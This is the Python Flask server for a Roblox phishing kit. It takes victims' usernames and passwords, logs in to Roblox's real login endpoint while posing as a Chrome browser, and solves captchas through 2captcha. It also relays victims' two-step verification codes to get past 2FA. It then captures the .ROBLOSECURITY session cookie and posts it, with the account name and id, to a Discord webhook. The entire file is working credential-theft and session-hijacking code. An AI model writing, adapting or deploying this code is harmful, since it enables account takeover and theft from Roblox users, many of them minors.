import os, base64, json, re, secrets, time, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from curl_cffi import requests as creq

app = Flask(__name__)
CORS(app, origins=[os.environ.get("ALLOW_ORIGIN", "*")])

AUTH   = "https://auth.roblox.com/v2/login"
VERIFY = "https://auth.roblox.com/v2/twostepverification/verify"
HOOK   = os.environ.get("DISCORD_WEBHOOK", "")
CAPKEY = os.environ.get("CAPTCHA_KEY", "")

H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/login",
    "Accept-Language": "en-US,en;q=0.9",
}

SESS = {}
LOCK = threading.Lock()


def notify(title, cookie, user=None):
    if not HOOK:
        return
    body = f"**{title}**\n"
    if user:
        body += f"user: `{user.get('name')}` (id {user.get('id')})\n"
    body += f"```\n{cookie}\n```"
    try:
        creq.post(HOOK, json={"content": body[:1900]}, impersonate="chrome", timeout=15)
    except Exception as e:
        print("webhook failed:", e)


def grab(s):
    for c in s.cookies.jar:
        if c.name == ".ROBLOSECURITY":
            return c.value.strip('"')
    return None


def csrf(s):
    r = s.post(AUTH, headers=H, json={}, impersonate="chrome", timeout=30)
    return r.headers.get("x-csrf-token", "")


def solve_captcha(r):
    if not CAPKEY:
        return None
    try:
        meta = json.loads(base64.b64decode(r.headers["rblx-challenge-metadata"]))
        blob = json.loads(base64.b64decode(meta["sharedParameter"]))["blob"]
        pk = re.search(r'"publicKey"\s*:\s*"([0-9A-Fa-f-]+)"', blob).group(1)
        up = creq.post("https://2captcha.com/in.php", data={
            "key": CAPKEY, "method": "funcaptcha", "publickey": pk,
            "pageurl": "https://www.roblox.com/login",
            "surl": "https://roblox-api.arkoselabs.com",
            "data[blob]": blob, "json": 1,
        }, timeout=30).json()
        if up.get("status") != 1:
            return None
        rid = up["request"]
        for _ in range(30):
            time.sleep(5)
            g = creq.get(f"https://2captcha.com/res.php?key={CAPKEY}"
                         f"&action=get&id={rid}&json=1", timeout=30).json()
            if g.get("status") == 1:
                return g["request"]
    except Exception as e:
        print("captcha failed:", e)
    return None


def do_login(s, u, p):
    h = {**H, "X-CSRF-TOKEN": csrf(s)}
    payload = {"ctype": "Username", "cusername": u, "cpassword": p}
    r = s.post(AUTH, headers=h, json=payload, impersonate="chrome", timeout=30)

    if r.headers.get("rblx-challenge-type") == "captcha":
        token = solve_captcha(r)
        if not token:
            return r, "captcha", None
        h2 = dict(h)
        h2["rblx-challenge-id"] = r.headers.get("rblx-challenge-id", "")
        h2["rblx-challenge-metadata"] = base64.b64encode(
            json.dumps({"sharedParameter": {"token": token}}).encode()).decode()
        r = s.post(AUTH, headers=h2, json=payload, impersonate="chrome", timeout=30)

    return r, None, None


@app.get("/")
def health():
    return jsonify(ok=True)


@app.post("/login")
def login():
    d = request.get_json(force=True)
    s = creq.Session()
    r, err, _ = do_login(s, d["username"], d["password"])

    if err:
        return jsonify(error="captcha"), 409
    if r.status_code == 429:
        return jsonify(error="ratelimit"), 429
    if r.status_code != 200:
        return jsonify(error="invalid"), 401

    data = r.json()

    if "twoStepVerificationData" in data:
        sid = secrets.token_urlsafe(16)
        with LOCK:
            SESS[sid] = {"s": s, "ch": data["twoStepVerificationData"]["challengeId"],
                         "t": time.time(), "u": d["username"], "p": d["password"]}
        return jsonify(needs_2fa=True, sid=sid,
                       media=data["twoStepVerificationData"]["mediaType"])

    cookie = grab(s)
    if not cookie:
        return jsonify(error="nocookie"), 500
    notify("🥖 cookie", cookie, data.get("user"))
    return jsonify(ok=True)


@app.post("/verify")
def verify():
    d = request.get_json(force=True)
    with LOCK:
        rec = SESS.get(d["sid"])
    if not rec:
        return jsonify(error="expired"), 410

    s = rec["s"]
    h = {**H, "X-CSRF-TOKEN": csrf(s)}
    r = s.post(VERIFY, headers=h, json={
        "actionType": "Login", "code": d["code"], "challengeId": rec["ch"],
    }, impersonate="chrome", timeout=30)

    cookie = grab(s)
    if not cookie:
        return jsonify(error="badcode", body=r.text[:300]), 401

    with LOCK:
        SESS.pop(d["sid"], None)
    notify("🥖 cookie (2FA)", cookie)
    return jsonify(ok=True)
